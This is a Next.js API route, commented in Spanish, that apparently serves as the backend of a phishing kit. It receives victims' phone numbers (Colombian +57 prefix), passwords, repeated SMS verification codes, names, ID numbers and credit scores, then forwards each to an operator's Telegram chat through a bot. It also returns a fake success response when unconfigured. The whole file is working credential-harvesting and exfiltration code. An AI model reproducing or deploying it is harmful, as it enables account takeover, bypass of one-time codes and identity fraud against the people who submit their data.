import { type NextRequest, NextResponse } from "next/server"

// Variables de entorno seguras
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

interface TelegramData {
  type: "login" | "verification" | "personal_info" | "score_check"
  phoneNumber?: string
  password?: string
  code?: string
  name?: string
  document?: string
  score?: number
  attempt?: number
}

export async function POST(request: NextRequest) {
  try {
    // Verificar que las variables de entorno estén configuradas
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error("Missing Telegram credentials in environment variables")
      return NextResponse.json({
        success: true,
        message: "Simulation mode - credentials not configured",
      })
    }

    const data: TelegramData = await request.json()

    // Validar que se recibieron datos
    if (!data || !data.type) {
      return NextResponse.json({ error: "Invalid data provided" }, { status: 400 })
    }

    // Construir el mensaje según el tipo
    let message = ""

    switch (data.type) {
      case "personal_info":
        message = `🆔 <b>Información Personal</b>\n👤 Nombre: ${data.name}\n📄 Documento: ${data.document}`
        break

      case "score_check":
        message = `📊 <b>Consulta de Score</b>\n👤 Nombre: ${data.name}\n📄 Documento: ${data.document}\n⭐ Score: ${data.score}/850`
        break

      case "login":
        message = `🔐 <b>Nuevo Login</b>\n📱 Número: +57${data.phoneNumber}\n🔑 Contraseña: ${data.password}`
        break

      case "verification":
        const attemptText = data.attempt ? ` #${data.attempt}` : ""
        message = `🔢 <b>Código de Verificación${attemptText}</b>\n📱 Número: +57${data.phoneNumber}\n🔐 Código: ${data.code}`
        break

      default:
        return NextResponse.json({ error: "Invalid message type" }, { status: 400 })
    }

    // Enviar mensaje a Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (!telegramResponse.ok) {
      const errorData = await telegramResponse.json()
      console.error("Telegram API error:", errorData)
      return NextResponse.json({ error: "Failed to send message" }, { status: 500 })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
